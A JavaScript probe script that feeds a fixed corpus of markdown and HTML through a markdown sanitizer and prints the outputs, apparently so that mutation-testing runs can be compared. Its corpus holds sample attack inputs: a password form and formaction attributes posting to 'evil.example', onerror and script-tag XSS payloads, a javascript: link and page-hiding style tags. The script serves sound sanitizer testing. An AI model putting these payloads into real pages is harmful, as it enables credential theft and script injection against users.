// Behaviour probe: renders a fixed corpus through the CURRENT working-tree
// renderMarkdown and prints `index<TAB>output` lines. Diff two runs to see
// whether a mutation changed observable behaviour at all.
import { JSDOM } from '/workspace/web/node_modules/jsdom/lib/api.js';
const dom = new JSDOM('');
globalThis.window = dom.window;
globalThis.document = dom.window.document;
const { renderMarkdown } = await import('/workspace/web/.tmp-test/util/markdown.js');

const corpus = [
  '<form action="https://evil.example"><input type="password"></form>',
  '<div formaction="https://evil.example">x</div>',
  '<a href="https://x.example" formaction="https://evil.example">a</a>',
  '<button formaction="https://evil.example">go</button>',
  '<input type="image" formaction="https://evil.example">',
  '<div action="https://evil.example">x</div>',
  '<div style="position:fixed">x</div>',
  '<div class="comment">x</div>',
  '<a href="https://x/f" download="invoice.pdf">dl</a>',
  '<div slot="footer">x</div>',
  '<dialog open>x</dialog>',
  '<svg><style>*{display:none}</style></svg>',
  '<style>*{display:none}</style>',
  '<select><option>a</option></select>',
  '<textarea>x</textarea>',
  '# hi',
  '- [x] done\n- [ ] todo',
  '```js\nconst a = 1;\n```',
  '<img src=x onerror=alert(1)>',
  '<script>alert(1)</script>',
  '[l](javascript:alert(1))',
  '<a href="https://e" target="_blank">t</a>',
  '<div id="x" name="y">c</div>',
  '<p>plain</p>',
];
for (let i = 0; i < corpus.length; i++) {
  process.stdout.write(`${i}\t${JSON.stringify(renderMarkdown(corpus[i]))}\n`);
}
process.stdout.write(`ARITY\t${renderMarkdown.length}\n`);
process.stdout.write(`NONSTR\t${JSON.stringify(renderMarkdown(42))}\n`);
